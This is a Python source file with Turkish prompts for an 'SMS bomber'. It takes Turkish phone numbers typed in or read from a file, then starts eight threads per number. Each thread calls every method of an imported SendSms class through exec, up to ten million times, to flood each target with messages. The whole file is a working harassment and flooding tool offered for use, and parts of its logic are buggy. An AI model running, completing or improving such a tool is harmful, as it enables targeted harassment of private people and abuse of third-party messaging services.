from colorama import Fore, Style, Back
from time import sleep
from os import system
from requests import get
from sms import SendSms
import threading

def Bomber():
    while 1:
        print(Style.RESET_ALL +Fore.LIGHTRED_EX + Back.LIGHTYELLOW_EX + "\nİpucu: Birden fazla girmek için ENTER tuşunu kullanın.")
        print(Style.RESET_ALL + "+90 ile başlayan telefon numarası giriniz: ",end="")
        telefon_no = input()
        tel_no = telefon_no.replace("+90", "").replace(" ", "")
        tel_liste = []
        if tel_no == "":
            print(Style.RESET_ALL + "Telefon numaralarının kayıtlı olduğu dosyanın dizinini yazınız: ",end="")
            dizin = input()
            try:
                with open(dizin, "r", encoding="utf-8") as f:
                    for i in f.read().strip().split("\n"):
                        if len(i) == 10:
                            tel_liste.append(i)
                sonsuz = ""
            except FileNotFoundError:
                system("cls||clear")
                print(Fore.LIGHTRED_EX + "Hatalı dosya dizini. Tekrar deneyiniz.")
                sleep(3)
                continue
        else:
            try:
                int(tel_no)
                if len(tel_no) != 10:
                    raise ValueError
                tel_liste.append(tel_no)
                sonsuz = "(Sonsuz ise 'enter' tuşuna basınız)"  
            except ValueError:
                system("cls||clear")
                print(Fore.LIGHTRED_EX + "Hatalı telefon numarası. Tekrar deneyiniz.") 
                sleep(3)
                continue
        try:
            print(Style.RESET_ALL +Fore.LIGHTRED_EX + Back.LIGHTYELLOW_EX + "\nİpucu: Bilmiyorsanız ENTER tuşunu kullanın.")
            print(Style.RESET_ALL + "Mail adresi giriniz: ",end="")
            mail = input()
            if ("@" not in mail or ".com" not in mail) and mail != "":
                raise
        except:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı mail adresi. Tekrar deneyiniz.") 
            sleep(3)
            continue
        system("cls||clear")
        try:
            print(Style.RESET_ALL +Fore.LIGHTRED_EX + Back.LIGHTYELLOW_EX + "\nİpucu: Sonsuz ise ENTER tuşunu kullanın.")
            print(Style.RESET_ALL + f"Kaç adet SMS göndermek istiyorsun: ",end="")
            kere = input()
            if kere:
                kere = int(kere)
            else:
                kere = None
        except ValueError:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. Tekrar deneyiniz.") 
            sleep(3)
            continue
        system("cls||clear")
        if kere is None:
            kere = 10000000
        else:
            continue
        aralik = 0

        def sms_gonder(tel_no, mail, kere, aralik):
            sms = SendSms(tel_no, mail)
            for _ in range(kere):
                for attribute in dir(SendSms):
                    attribute_value = getattr(SendSms, attribute)
                    if callable(attribute_value):
                        if attribute.startswith('__') == False:
                            if sms.adet == kere:
                                break
                            exec("sms."+attribute+"()")

        for i in tel_liste:
            thread1 = threading.Thread(target=sms_gonder, args=(i, mail, kere, aralik))
            thread2 = threading.Thread(target=sms_gonder, args=(i, mail, kere, aralik))
            thread3 = threading.Thread(target=sms_gonder, args=(i, mail, kere, aralik))
            thread4 = threading.Thread(target=sms_gonder, args=(i, mail, kere, aralik))
            thread5 = threading.Thread(target=sms_gonder, args=(i, mail, kere, aralik))
            thread6 = threading.Thread(target=sms_gonder, args=(i, mail, kere, aralik))
            thread7 = threading.Thread(target=sms_gonder, args=(i, mail, kere, aralik))
            thread8 = threading.Thread(target=sms_gonder, args=(i, mail, kere, aralik))
            thread8.start()
            thread7.start()
            thread6.start()
            thread5.start()
            thread4.start()
            thread3.start()
            thread2.start()
            thread1.start()
            sleep(0.4)
            sms = SendSms(i, mail)
            if isinstance(kere, int):
                    while sms.adet < kere:
                        for attribute in dir(SendSms):
                            attribute_value = getattr(SendSms, attribute)
                            if callable(attribute_value):
                                if attribute.startswith('__') == False:
                                    if sms.adet == kere:
                                        break
                                    exec("sms."+attribute+"()")
        print(Fore.LIGHTRED_EX + "\nMenüye dönmek için 'enter' tuşuna basınız..")
        input()